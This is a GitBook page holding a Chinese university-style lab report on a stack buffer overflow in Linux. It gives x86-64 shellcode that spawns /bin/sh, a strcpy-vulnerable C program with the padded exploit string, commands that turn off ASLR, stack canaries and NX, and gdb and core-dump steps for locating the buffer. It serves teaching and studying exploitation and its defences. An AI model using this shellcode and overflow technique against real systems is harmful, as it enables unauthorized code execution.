@@ -1,0 +1,370 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>stack overflow · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="操作系统安全实验二.html" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2" data-path="栈溢出实验.html">
+            
+                <a href="栈溢出实验.html">
+            
+                    
+                    stack overflow
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="操作系统安全实验二.html">
+            
+                <a href="操作系统安全实验二.html">
+            
+                    
+                    setuid & capabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >stack overflow</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5B89;&#x5168;&#x5B9E;&#x9A8C;&#x4E00;">&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5B89;&#x5168;&#x5B9E;&#x9A8C;&#x4E00;</h1>
+<hr>
+<h2 id="&#x5B9E;&#x9A8C;&#x76EE;&#x7684;">&#x5B9E;&#x9A8C;&#x76EE;&#x7684;</h2>
+<ul>
+<li>&#x7406;&#x89E3;&#x638C;&#x63E1;<code>C</code> &#x6808;&#x5E27;&#x7ED3;&#x6784;</li>
+<li><code>Shellcode</code> &#x6784;&#x9020;</li>
+<li>&#x52A0;&#x6DF1;&#x7406;&#x89E3;&#x6808;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x539F;&#x7406;&#x53CA;&#x9632;&#x62A4;&#x63AA;&#x65BD;</li>
+</ul>
+<h2 id="&#x5B9E;&#x9A8C;&#x8981;&#x6C42;">&#x5B9E;&#x9A8C;&#x8981;&#x6C42;</h2>
+<ul>
+<li>&#x5728;&#x5173;&#x95ED;&#x5B89;&#x5168;&#x673A;&#x5236;&#x4E0B;,&#x5728;Linux&#x7CFB;&#x7EDF;&#x5E73;&#x53F0;&#x4E0A;&#x5B9E;&#x73B0;&#x7F13;&#x51B2;&#x533A;&#x6EA2;&#x51FA;&#x653B;&#x51FB;</li>
+<li>&#x5F00;&#x542F;&#x5B89;&#x5168;&#x4FDD;&#x62A4;&#x673A;&#x5236;,&#x8FD0;&#x884C;&#x4E00;&#x6837;&#x7684;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x4EE3;&#x7801;,&#x6BD4;&#x8F83;&#x5B9E;&#x73B0;&#x73B0;&#x8C61;</li>
+</ul>
+<h2 id="&#x5B9E;&#x9A8C;&#x5C55;&#x793A;">&#x5B9E;&#x9A8C;&#x5C55;&#x793A;</h2>
+<ol>
+<li>&#x5B9E;&#x9A8C;&#x539F;&#x7406;</li>
+</ol>
+<p>&#x200B;      <code>C</code> &#x6808;&#x5E27;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p><img src="assets/&#x9009;&#x533A;_025.png" alt="&#x533A;_02"></p>
+<p>&#x200B;         &#x56E0;&#x6B64;&#x5F53;&#x5F53;&#x524D;&#x5E27;&#x7684;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x548C;&#x4E34;&#x65F6;&#x53D8;&#x91CF;&#x8D85;&#x51FA;&#x533A;&#x57DF;&#xFF0C;&#x8986;&#x76D6;&#x4E86;<code>ebp</code> &#x548C;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;&#x6808;&#x6EA2;&#x51FA;&#x653B;&#x51FB;&#x3002;&#x518D;&#x901A;&#x8FC7;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#xFF0C;&#x4F7F;&#x5176;&#x4E3A;<code>Shellcode</code> &#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;&#xFF0C;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x8FD0;&#x884C;&#x6D41;&#x7684;&#x52AB;&#x6301;&#x3002;</p>
+<ol>
+<li>&#x5B9E;&#x9A8C;&#x5E73;&#x53F0;</li>
+</ol>
+<p>&#x200B;      &#x5B9E;&#x9A8C;&#x57FA;&#x4E8E; 64&#x4F4D; <code>Ubuntu \ 16.04</code> &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7248;&#x672C;&#x4EE5;&#x53CA; <code>gcc,gdb</code> &#x7248;&#x672C;&#x4FE1;&#x606F;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code class="lang-txt">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609
+
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+</code></pre>
+<ol>
+<li><code>Shellcode</code>  &#x4EE3;&#x7801;</li>
+</ol>
+<p>&#x200B;       <code>Shellcode</code> &#x662F;&#x4E00;&#x6BB5;&#x653B;&#x51FB;&#x8005;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x7684;&#x6076;&#x610F;&#x4EE3;&#x7801;&#xFF0C;&#x901A;&#x5E38;&#x8981;&#x6C42;&#x4E0E;&#x4F4D;&#x7F6E;&#x65E0;&#x5173;&#xFF0C;&#x4E14;&#x672C;&#x5B9E;&#x9A8C;&#x4E2D;&#x5229;&#x7528; <code>strcpy()</code> &#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x6B64;<code>Shellcode</code>  &#x4EE3;&#x7801;&#x4E2D;&#x4E0D;&#x80FD;&#x51FA;&#x73B0;  <code>\x00</code> &#xFF0C;&#x4F1A;&#x88AB;&#x5F53;&#x4F5C;<code>\0</code>&#x4ECE;&#x800C;&#x7ED3;&#x675F;&#x62F7;&#x8D1D;&#x3002;</p>
+<p>&#x200B;       &#x7F16;&#x5199;<code>Shellcode</code> &#xFF0C;&#x8BE5;<code>shellcode</code> &#x8C03;&#x7528;<code>execve(&quot;/bin/sh&quot;,NULL)</code> &#xFF0C;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x65B0;&#x7684;<code>shell</code>&#xFF0C;&#x9A8C;&#x8BC1;&#x5176;&#x529F;&#x80FD;&#xFF0C;&#x53C2;&#x8003;: <a href="https://www.exploit-db.com/exploits/36858/" target="_blank">https://www.exploit-db.com/exploits/36858/</a> &#xFF0C;&#x7F16;&#x5199;&#x6C47;&#x7F16;&#x6587;&#x4EF6;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code class="lang-asm">.global _start
+_start:
+    # char *const argv[]
+    xorl %esi, %esi
+
+    # &apos;h&apos; &apos;s&apos; &apos;/&apos; &apos;/&apos; &apos;n&apos; &apos;i&apos; &apos;b&apos; &apos;/&apos;
+    movq `0x68732f2f6e69622f, %rbx
+
+    # for &apos;\x00&apos;
+    pushq %rsi
+    pushq %rbx
+    pushq %rsp
+
+    # const char *filename
+    popq %rdi
+
+    # __NR_execve 59
+    pushq `59
+    popq %rax
+
+    # char *const envp[]
+    xorl %edx, %edx
+    syscall
+</code></pre>
+<p><img src="assets/&#x9009;&#x533A;_028.png" alt="&#x533A;_02"></p>
+<p>   &#x63D0;&#x53D6;&#x673A;&#x5668;&#x7801;&#xFF1A;</p>
+<p><img src="assets/&#x9009;&#x533A;_029.png" alt="&#x533A;_02"></p>
+<ol>
+<li>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;</li>
+</ol>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overflow</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* str)</span></span>{
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>];
+    <span class="hljs-built_in">strcpy</span>(buf, str);
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    <span class="hljs-keyword">char</span> str[<span class="hljs-number">60</span>]=<span class="hljs-string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>
+                  <span class="hljs-string">&quot;\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>;
+    overflow(str);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>&#x200B;       &#x4E0A;&#x9762;&#x8FD9;&#x6BB5;&#x7A0B;&#x5E8F;&#x6808;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728;<code>strcpy</code>&#x51FD;&#x6570;, &#x51FD;&#x6570;&#x6CA1;&#x6709;&#x505A;&#x8FB9;&#x754C;&#x68C0;&#x67E5;&#xFF0C;&#x53EF;&#x5BFC;&#x81F4;&#x6808;&#x6EA2;&#x51FA;&#x8986;&#x76D6;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x3002;&#x6210;&#x529F;&#x5229;&#x7528;&#x6808;&#x6EA2;&#x51FA;&#x9700;&#x8981;&#x786E;&#x5B9A;&#x8986;&#x76D6;&#x591A;&#x5C11;&#x4E2A;&#x5B57;&#x8282;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x5230;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x3002;&#x56E0;&#x6B64;&#x5728;<code>gdb</code>&#x8C03;&#x8BD5;&#x65F6;&#x786E;&#x5B9A;<code>shellcode</code>&#x7684;&#x5730;&#x5740;&#x5373;<code>str</code>&#x590D;&#x5236;&#x540E;<code>buf</code>&#x7684;&#x9996;&#x5730;&#x5740;&#xFF0C;&#x8BA9;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x6307;&#x5411;&#x8BE5;&#x5730;&#x5740;&#x3002;</p>
+<ol>
+<li>&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;</li>
+</ol>
+<p>&#x200B;     &#x5B9E;&#x9A8C;&#x524D;&#x4E3A;&#x4E86;&#x66F4;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x9700;&#x8981;&#x5173;&#x95ED;&#x4E00;&#x4E9B;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;&#x3002;</p>
+<ul>
+<li><p><code>ASLR</code> (&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x5E03;&#x5C40;&#x968F;&#x673A;&#x5316;)</p>
+<p>&#x5173;&#x95ED;<code>ASLR</code>&#xFF1A;<code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></p>
+</li>
+<li><p><code>Cannary</code></p>
+<p>&#x5F00;&#x542F;<code>Canary</code>&#x4E4B;&#x540E;&#xFF0C;&#x51FD;&#x6570;&#x5F00;&#x59CB;&#x65F6;&#x5728;ebp&#x548C;&#x4E34;&#x65F6;&#x53D8;&#x91CF;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x503C;&#xFF0C;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#x65F6;&#x9A8C;&#x8BC1;&#x8FD9;&#x4E2A;&#x503C;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x76F8;&#x7B49;&#xFF08;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x503C;&#x88AB;&#x5176;&#x4ED6;&#x503C;&#x8986;&#x76D6;&#x4E86;&#xFF09;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528; <code>_stackchk_fail</code>&#x51FD;&#x6570;&#xFF0C;&#x7EC8;&#x6B62;&#x8FDB;&#x7A0B;&#x3002;&#x5BF9;&#x5E94;GCC&#x7F16;&#x8BD1;&#x9009;&#x9879;<code>-fno-stack-protector</code>&#x89E3;&#x9664;&#x8BE5;&#x4FDD;&#x62A4;&#x3002;</p>
+</li>
+<li><p><code>NX</code>
+&#x5F00;&#x542F;<code>NX</code>&#x4FDD;&#x62A4;&#x4E4B;&#x540E;&#xFF0C;&#x7A0B;&#x5E8F;&#x7684;&#x5806;&#x6808;&#x5C06;&#x4F1A;&#x4E0D;&#x53EF;&#x6267;&#x884C;&#x3002;&#x5BF9;&#x5E94;GCC&#x7F16;&#x8BD1;&#x9009;&#x9879;<code>-z execstack</code>&#x89E3;&#x9664;&#x8BE5;&#x4FDD;&#x62A4;&#x3002;    </p>
+</li>
+</ul>
+<p>&#x7F16;&#x8BD1;&#x8C03;&#x8BD5;&#xFF1A;</p>
+<p><img src="assets/&#x9009;&#x533A;_031.png" alt="&#x533A;_03"></p>
+<p>&#x200B;       &#x4ECE;&#x8C03;&#x8BD5;&#x7ED3;&#x679C;&#x53EF;&#x77E5;&#xFF0C;<code>buf</code> &#x7684;&#x9996;&#x5730;&#x5740;&#x4E3A; <code>0x7fffffffdaa0</code> &#xFF0C;&#x4E14;&#x67E5;&#x770B;&#x5185;&#x5B58;&#x8BE5;&#x5730;&#x5740;&#x5904;&#x786E;&#x5B9E;&#x4E3A; <code>Shellcode</code> &#x8D77;&#x59CB;&#x4EE3;&#x7801;&#x3002;&#x4E3A;&#x4E86;&#x8986;&#x76D6;&#x5230;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#xFF0C;&#x5373;&#x586B;&#x5145;&#x5B57;&#x8282;&#x81F3;&#x4E14;&#x5305;&#x62EC;8&#x5B57;&#x8282;<code>rbp</code> (<code>0x7fffffffdac0</code>) &#xFF0C;&#x5219;&#x9664;&#x4E86;<code>shellcode</code>&#x5916;&#x8FD8;&#x9700;&#x8981;&#x586B;&#x5145;17&#x5B57;&#x8282;&#x3002;&#x53E6;&#x5916;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x4E3A;<code>0x7fffffffdaa0</code>,&#x6539;&#x4E3A;&#x5C0F;&#x7AEF;&#x6A21;&#x5F0F;<code>\xa0\xda\xff\xff\xff\x7f</code>&#x3002;&#x56E0;&#x6B64;&#xFF1A;</p>
+<pre><code class="lang-c"><span class="hljs-keyword">char</span> str[<span class="hljs-number">60</span>]=<span class="hljs-string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&quot;</span>
+              <span class="hljs-string">&quot;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>
+              <span class="hljs-string">&quot;\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61&quot;</span>
+              <span class="hljs-string">&quot;\xa0\xda\xff\xff\xff\x7f\x00\x00&quot;</span>;
+</code></pre>
+<p>&#x200B;     &#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#xFF0C;gdb&#x8C03;&#x8BD5;&#x8FD0;&#x884C;&#xFF1A;</p>
+<p><img src="assets/&#x9009;&#x533A;_032.png" alt="&#x533A;_03"></p>
+<p> &#x6210;&#x529F;&#x8FD0;&#x884C;&#x3002;&#x7136;&#x800C;&#x5B9E;&#x9645;&#x8FD0;&#x884C;&#x5374;&#x662F;&#x6BB5;&#x9519;&#x8BEF;&#xFF0C;&#x539F;&#x56E0;&#x662F;gdb&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x53D8;&#x91CF;&#x73AF;&#x5883;&#xFF0C;&#x53D8;&#x91CF;&#x7684;&#x5B58;&#x653E;&#x5730;&#x5740;&#x548C;&#x7A0B;&#x5E8F;&#x5B9E;&#x9645;&#x8FD0;&#x884C;&#x4F1A;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x9700;&#x8981;&#x628A;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x6539;&#x4E3A;shellcode&#x5B9E;&#x9645;&#x5B58;&#x653E;&#x7684;&#x5730;&#x5740;&#x5373;&#x53EF;&#xFF0C;&#x586B;&#x5145;&#x957F;&#x5EA6;&#x65E0;&#x987B;&#x6539;&#x53D8;&#xFF0C;&#x56E0;&#x4E3A;&#x76F8;&#x5BF9;&#x504F;&#x79FB;&#x4E0D;&#x53D8;&#x3002;</p>
+<p>&#x83B7;&#x53D6;<code>shellcode</code> &#x5B9E;&#x9645;&#x5730;&#x5740;&#xFF0C;&#x53EF;&#x4EE5;&#x6253;&#x5370;&#x51FA;<code>buf</code> &#x5730;&#x5740;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5185;&#x6838;&#x8F6C;&#x50A8;&#x83B7;&#x53D6;&#x771F;&#x5B9E;&#x5730;&#x5740;&#x3002;&#x9996;&#x5148;&#x542F;&#x7528;&#x5185;&#x6838;&#x8F6C;&#x50A8; <code>ulimit -c unlimited</code>  &#xFF0C;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5185;&#x6838;&#x5728;coredump&#x65F6;&#x6240;&#x4EA7;&#x751F;&#x7684;core&#x6587;&#x4EF6;&#x653E;&#x5728;&#x4E0E;&#x8BE5;&#x7A0B;&#x5E8F;&#x76F8;&#x540C;&#x7684;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x540D;&#x56FA;&#x5B9A;&#x4E3A;core&#x3002;</p>
+<p><img src="assets/&#x9009;&#x533A;_033.png" alt="&#x533A;_03"></p>
+<p>&#x56E0;&#x6B64;&#x4FEE;&#x6539;<code>str</code> &#x5C3E;&#x90E8;&#x4E3A;<code>\x10\xdb\xff\xff\xff\x7f\x00\x00</code>&#x3002;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x8FD0;&#x884C;&#xFF1A;</p>
+<p><img src="assets/&#x9009;&#x533A;_034.png" alt="&#x533A;_03"></p>
+<p>&#x82E5;&#x542F;&#x7528;&#x4FDD;&#x62A4;&#x63AA;&#x65BD;&#xFF0C;&#x6B63;&#x5E38;&#x7F16;&#x8BD1;&#xFF1A;</p>
+<p><img src="assets/&#x9009;&#x533A;_035.png" alt="&#x533A;_03"></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Introduction">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="操作系统安全实验二.html" class="navigation navigation-next " aria-label="Next page: setuid & capabilities">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"stack overflow","level":"1.2","depth":1,"next":{"title":"setuid & capabilities","level":"1.3","depth":1,"path":"操作系统安全实验二.md","ref":"操作系统安全实验二.md","articles":[]},"previous":{"title":"Introduction","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"栈溢出实验.md","mtime":"2018-04-26T14:23:07.194Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2018-04-26T14:09:30.251Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
